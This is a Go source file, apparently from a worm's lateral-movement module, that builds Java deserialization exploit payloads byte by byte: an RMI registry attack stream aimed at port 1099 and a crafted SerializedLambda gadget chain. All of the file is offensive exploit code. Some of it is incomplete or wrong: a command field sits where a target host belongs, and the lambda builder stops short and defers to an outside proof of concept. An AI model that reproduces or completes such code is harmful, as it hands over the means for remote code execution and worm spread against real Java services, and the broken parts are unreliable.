// worm_bb/jvm_lateral/chains.go
// Gadget chain implementations.
// Go-native Java serialization stream construction for each exploit chain.

package jvm_lateral

// --- RMI payload builder ---
// RMI deserialization attacks target the RMI Registry or DGC
func buildRMIPayload(cfg *GadgetConfig) []byte {
	// RMI wire protocol:
	// 0x4A 0x52 0x4D 0x49 (JRMI magic)
	// + version + protocol + endpoint + serialized data

	s := NewSerialStream()

	// JRMI header: "JRMI" + version 0x0002 + protocol
	s.writeBytes([]byte{0x4A, 0x52, 0x4D, 0x49}) // JRMI magic
	s.writeUint16(0x0002)                          // version
	s.writeByte(0x4B)                              // StreamProtocol

	// Endpoint identification (host, port)
	s.WriteString(cfg.Command) // placeholder — would be target host
	s.writeUint16(1099)        // port

	// New connection UUID
	magic := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	s.writeBytes(magic)

	// Serialized payload (the actual gadget chain)
	submapPayload := buildSubMapPayload(cfg)
	s.writeBytes(submapPayload)

	return s.Bytes()
}

// --- SerializedLambda this$0 injection payload ---
// From b0t's article: inject a crafted SerializedLambda with
// malicious capturedArg[0] = Callback holding this$0 reference
func buildLambdaPayload(cfg *GadgetConfig) []byte {
	s := NewSerialStream()

	// TC_OBJECT -> SerializedLambda class
	// Fields we control:
	//   capturingClass -> LambdaHost.Callback
	//   capturedArgs[0] -> Callback instance with this$0 pointing to
	//                      our malicious LambdaHost

	// Write SerializedLambda classdesc
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.invoke.SerializedLambda")
	s.writeInt64(3045579739652142194) // UID
	s.writeByte(0x03)                 // SC_SERIALIZABLE | SC_WRITE_METHOD
	s.writeUint16(10)                 // 10 fields

	serializedLambdaFields := []ClassField{
		{Typecode: 'L', ClassName: "java.lang.Class", FieldName: "capturingClass"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "functionalInterfaceClass"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "functionalInterfaceMethodName"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "functionalInterfaceMethodSignature"},
		{Typecode: 'I', FieldName: "implMethodKind"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "implClass"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "implMethodName"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "implMethodSignature"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "instantiatedMethodType"},
		{Typecode: '[', ClassName: "[Ljava.lang.Object;", FieldName: "capturedArgs"},
	}

	for _, f := range serializedLambdaFields {
		s.writeByte(f.Typecode)
		if f.Typecode == 'L' || f.Typecode == '[' {
			s.WriteString(f.ClassName)
		}
		s.WriteString(f.FieldName)
	}

	s.WriteTC(TC_ENDBLOCKDATA)

	// Superclass: java.lang.Object
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.Object")
	s.writeInt64(0)
	s.writeByte(0x01)
	s.writeUint16(0)
	s.WriteTC(TC_ENDBLOCKDATA)
	s.WriteTC(TC_NULL)

	// Now write the actual SerializedLambda object fields
	// capturedArgs[0] = Callback(this$0 = LambdaHost with our config)
	// For full implementation, see b0t's PoC

	return s.Bytes()
}
